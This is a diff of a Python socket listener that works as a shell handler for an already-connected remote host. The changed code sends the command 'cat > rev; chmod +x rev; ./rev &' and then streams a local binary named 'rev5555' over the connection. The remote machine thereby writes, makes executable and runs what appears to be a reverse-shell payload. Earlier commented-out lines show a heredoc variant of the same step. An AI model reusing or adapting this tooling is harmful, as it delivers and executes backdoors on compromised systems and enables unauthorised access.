@@ -19,6 +19,7 @@ def recv_proxy_stream(con):
 def send_stream(con):
     global conn
     global S
+
     while True:
         data = S.recv(1024)
         print(data)
@@ -39,9 +40,14 @@ def recv_stream_save(con):
 def recv_stream(con):
     global conn
     global S
+    con.settimeout(0.2)
     while True:
-        data = con.recv(1024)
-        print(f"received: {data}")
+        try:
+            data = con.recv(1024)
+            if data:
+                print(f"received: {data}")
+        except:
+            pass
 
 def recv_data(con):
     global conn
@@ -54,9 +60,15 @@ def recv_data(con):
             print(f"received: {data}")
         else:
             return d
-            
+running = True            
 
-
+def recv(conn):
+    global running
+    while running:
+        try:
+            conn.recv(1024)
+        except:
+            pass
 
 def send(conn, data):
     print()
@@ -64,8 +76,10 @@ def send(conn, data):
         print(f"\nsending {data}")
     else:
         print("sending large chunk")
+
     conn.sendall(data)
-    print()
+
+    #print()
     time.sleep(1)
 
 
@@ -82,57 +96,37 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.bind((HOST, PORT))
     sock.listen(1)
     conn, addr = sock.accept()
+    conn.settimeout(0.2)
     with conn:
         print('Connected by', addr)
         #threading.Thread(target=send_stream, args=(conn,)).start()
-        threading.Thread(target=recv_stream_save, args=(conn,)).start()
-        #threading.Thread(target=recv_stream, args=(conn,)).start()
+        #threading.Thread(target=recv_stream_save, args=(conn,)).start()
+        threading.Thread(target=recv_stream, args=(conn,)).start()
 
+        #threading.Thread(target=recv, args=(conn,)).start()
         #threading.Thread(target=recv_proxy_stream, args=(conn,)).start()
 
 
-        s = "find /bin/; find /usr/bin; echo __LOL__\r".encode()
+
+
+        s = f"cat > rev; chmod +x rev; ./rev &\n".encode()#; chmod +x rev; ./rev &\n".encode()
         send(conn, s)
-        
-        time.sleep(0.1)
-        with open("recv_stream", "r") as f:
+
+
+        with open("rev5555","rb") as f:
             r = f.read()
-        
-
-        if "/bin/bash" in r:
-            print("/bin/bash available")
-
-        print(f" 1 included {r.count("__LOL__")} times")
-
-        
+        send(conn, r)
 
 
 
 
-        #s = "script /dev/null\r".encode()
-        #send(conn, s)
-
-        #s = f"cat<<EOF > rev.sh; chmod +x rev.sh; ./rev.sh &\r".encode()
+        #s = "\x04\n".encode()
         #send(conn, s)
 
 
-        ##conn.sendfile("rev.sh")
-        #with open("rev.sh","rb") as f:
-        #    r = f.read()
-        #send(conn, r)
-
-        #s = f"EOF\r".encode()
-        #send(conn, s)
-
-        #s = f"\x04\r".encode()
-        #send(conn, s)
-
-        #s = f"ls\r".encode()
-        #send(conn, s)
-
-        time.sleep(100)
-        #conn.close()
+        conn.close()
         #print(s)
-        #sock.shutdown(socket.SHUT_RDWR)  # Send EOF to signal the end of transmission
+        running = False
+        #exit()
 
 
